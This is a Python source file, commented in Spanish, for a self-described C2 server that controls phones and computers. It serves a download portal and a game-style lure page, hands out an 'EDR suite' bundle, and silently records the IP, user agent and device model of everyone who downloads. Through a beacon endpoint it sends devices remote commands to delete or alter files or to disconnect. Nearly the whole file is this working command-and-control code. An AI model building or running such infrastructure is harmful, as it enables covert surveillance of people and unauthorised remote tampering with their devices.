#!/usr/bin/env python3
"""
APEX_C2_SERVER.PY - SERVIDOR WEB C2 DETERMINISTA Y CONTROLADOR DE ENDPOINTS
Sirve el Dashboard de Control en http://192.168.100.7:8080 y http://localhost:8080
Funcionalidades clave:
1. Registro obligatorio y automático de 100% de personas/dispositivos que descarguen el archivo.
2. Identificación precisa del modelo exacto del celular (Samsung Galaxy SM-XXXX, etc.).
3. Acciones remotas individuales por dispositivo:
   - BORRAR ARCHIVO DEL CELULAR (Purga / Wipe remoto)
   - MODIFICAR ARCHIVO PARA AÑADIRLE COSAS (Actualización dinámica OTA)
   - DESCONECTAR DISPOSITIVO (Revocación inmediata)
4. Balizas de telemetría y confirmación de remediación forense.
"""

import os
import sys
import json
import time
import socket
import datetime
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
import urllib.parse
from real_network_scanner import scan_network
import device_manager
from device_detector import identify_device

if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

PORT = 8080
HOST = "0.0.0.0"

class ApexC2RequestHandler(SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Sec-CH-UA-Model, Sec-CH-UA-Platform")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        client_ip = self.client_address[0]

        # 1. Dashboard Principal
        if path in ["/", "/index.html"]:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            target_html = "killswitch_dashboard.html" if os.path.exists("killswitch_dashboard.html") else "index.html"
            with open(target_html, "rb") as f:
                self.wfile.write(f.read())
            return

        # 2. Portal de Descarga Móvil Interactivo
        elif path in ["/portal", "/download", "/descargar"]:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            portal_html = "download_portal.html" if os.path.exists("download_portal.html") else "index.html"
            with open(portal_html, "rb") as f:
                self.wfile.write(f.read())
            return

        # 2.5 Activator Game (Pantalla Morada 'Cargando juego...')
        elif path in ["/game", "/activator", "/activator_game.html", "/juego"]:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            game_html = "activator_game.html" if os.path.exists("activator_game.html") else "download_portal.html"
            with open(game_html, "rb") as f:
                self.wfile.write(f.read())
            return

        # 3. Estado API
        elif path == "/api/status":
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            state = device_manager.load_state()
            self.wfile.write(json.dumps(state, ensure_ascii=False).encode("utf-8"))
            return

        # 4. Escaneo de Red Local
        elif path == "/api/scan":
            state = scan_network()
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(state, ensure_ascii=False).encode("utf-8"))
            return

        # 5. Descarga de Bundle Principal (Registro 100% Obligatorio de Quien Descargue)
        elif path == "/download/bundle":
            bundle = "APEX_CYBER_EDR_SUITE.zip"
            if not os.path.exists(bundle):
                bundle = "CYBER_KILLSWITCH_TEST_BUNDLE.zip"
            
            if os.path.exists(bundle):
                # Capturar telemetría HTTP de quien descarga
                ua = self.headers.get("User-Agent", "")
                ch_model = self.headers.get("Sec-CH-UA-Model", "")
                
                # Registrar INEVITABLEMENTE al usuario / celular que descarga
                device_manager.register_download_event(
                    client_ip=client_ip,
                    user_agent=ua,
                    client_hints_model=ch_model,
                    file_name=bundle
                )

                self.send_response(200)
                self.send_header("Content-Type", "application/zip")
                self.send_header("Content-Disposition", f"attachment; filename={bundle}")
                self.send_header("Content-Length", str(os.path.getsize(bundle)))
                self.end_headers()
                with open(bundle, "rb") as f:
                    self.wfile.write(f.read())
                return
            else:
                self.send_error(404, "Bundle no encontrado.")
                return

        # 6. Descarga de Archivos Individuales (También Registra al Dispositivo)
        elif path.startswith("/download/"):
            fname = path.replace("/download/", "")
            allowed = ["agent_probe.py", "cleaner_killswitch.py", "cleaner_killswitch.ps1", "agent_killswitch.ps1", "README_KILLSWITCH.md", "mobile_agent.py", "activator_game.html"]
            if fname in allowed and os.path.exists(fname):
                ua = self.headers.get("User-Agent", "")
                ch_model = self.headers.get("Sec-CH-UA-Model", "")
                device_manager.register_download_event(
                    client_ip=client_ip,
                    user_agent=ua,
                    client_hints_model=ch_model,
                    file_name=fname
                )
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f"attachment; filename={fname}")
                self.send_header("Content-Length", str(os.path.getsize(fname)))
                self.end_headers()
                with open(fname, "rb") as f:
                    self.wfile.write(f.read())
                return
            else:
                self.send_error(404, "Archivo no disponible para descarga.")
                return

        # Archivos estáticos
        super().do_GET()

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8") if length > 0 else "{}"
        client_ip = self.client_address[0]
        
        try:
            req_data = json.loads(body)
        except Exception:
            req_data = {}

        # 1. Registro explícito de descarga desde el Portal Móvil
        if path == "/api/register_download":
            ua = req_data.get("user_agent", self.headers.get("User-Agent", ""))
            ch_model = req_data.get("model", self.headers.get("Sec-CH-UA-Model", ""))
            webgl = req_data.get("webgl_renderer", "")
            fname = req_data.get("download_file", "APEX_CYBER_EDR_SUITE.zip")

            dev = device_manager.register_download_event(
                client_ip=client_ip,
                user_agent=ua,
                client_hints_model=ch_model,
                webgl_renderer=webgl,
                extra_data=req_data,
                file_name=fname
            )
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps({"success": True, "device": dev}, ensure_ascii=False).encode("utf-8"))
            return

        # 2. Acciones individuales por dispositivo (Borrar, Modificar, Desconectar)
        elif path == "/api/device_action":
            device_id = req_data.get("id") or req_data.get("device_id")
            action = req_data.get("action")  # PURGE_FILE, MODIFY_FILE, DISCONNECT
            payload = req_data.get("payload")

            result = device_manager.execute_device_action(device_id, action, payload)
            self.send_response(200 if result["success"] else 400)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(result, ensure_ascii=False).encode("utf-8"))
            return

        # 3. Confirmación de acción ejecutada desde el celular
        elif path == "/api/device_confirm":
            device_id = req_data.get("id") or req_data.get("device_id")
            action = req_data.get("action")
            status = req_data.get("status", "SUCCESS")
            result = device_manager.confirm_device_action(device_id, action, status, req_data)
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(result, ensure_ascii=False).encode("utf-8"))
            return

        # 4. Control global de Kill-Switch
        elif path == "/api/killswitch":
            command = req_data.get("command", "MONITOR")
            status = req_data.get("status", "ACTIVE")
            
            state = device_manager.load_state()
            state["command"] = command
            state["status"] = status
            state["kill_switch_engaged"] = (command == "PURGE")
            state["audit_log"].append({
                "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
                "action": f"KILLSWITCH_SWITCHED_TO_{command}",
                "actor": "WEB_DASHBOARD_OPERATOR",
                "detail": f"El operador conmutó el estado global a {command}."
            })
            device_manager.save_state(state)

            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(state, ensure_ascii=False).encode("utf-8"))
            return

        # 5. Baliza de agentes periódica
        elif path == "/api/beacon":
            state = device_manager.load_state()
            node_id = req_data.get("node_id", "UNKNOWN_NODE")
            
            # Buscar dispositivo
            target_dev = None
            for dev in state.get("devices", []):
                if dev.get("id") == node_id or dev.get("ip") == client_ip:
                    target_dev = dev
                    break

            if target_dev:
                target_dev["status"] = req_data.get("status", "ONLINE")
                target_dev["last_beacon"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
                if "battery" in req_data:
                    target_dev["battery"] = req_data["battery"]
                if "os" in req_data:
                    target_dev["os"] = req_data["os"]
            else:
                # Si no existía, registrar mediante el detector de hardware
                target_dev = device_manager.register_download_event(
                    client_ip=client_ip,
                    user_agent=req_data.get("user_agent", self.headers.get("User-Agent", "")),
                    client_hints_model=req_data.get("model", ""),
                    extra_data=req_data
                )

            device_manager.save_state(state)

            # Responder con directiva global y directiva individual del dispositivo
            response_payload = {
                "status": state["status"],
                "command": state["command"],
                "kill_switch_engaged": state["kill_switch_engaged"],
                "purge_token": state["purge_token"],
                "device_action": target_dev.get("pending_action") if target_dev else None,
                "modification_payload": target_dev.get("modification_payload") if target_dev else None,
                "action_token": target_dev.get("action_token") if target_dev else None
            }

            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(response_payload, ensure_ascii=False).encode("utf-8"))
            return

        self.send_error(404, "Endpoint no encontrado")

def run_server():
    server_address = (HOST, PORT)
    httpd = ThreadingHTTPServer(server_address, ApexC2RequestHandler)
    print(f"================================================================")
    print(f"🚀 SERVIDOR APEX C2 INICIADO CON ÉXITO")
    print(f"🌐 Dashboard Maestro  : http://localhost:{PORT}")
    print(f"📱 Acceso Celular/LAN : http://192.168.100.7:{PORT}")
    print(f"📥 Portal de Descarga : http://192.168.100.7:{PORT}/portal")
    print(f"📦 Endpoint Estado    : http://192.168.100.7:{PORT}/api/status")
    print(f"🔍 Escaneo de Red     : http://192.168.100.7:{PORT}/api/scan")
    print(f"================================================================\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Deteniendo servidor C2...")
        httpd.server_close()

if __name__ == "__main__":
    run_server()
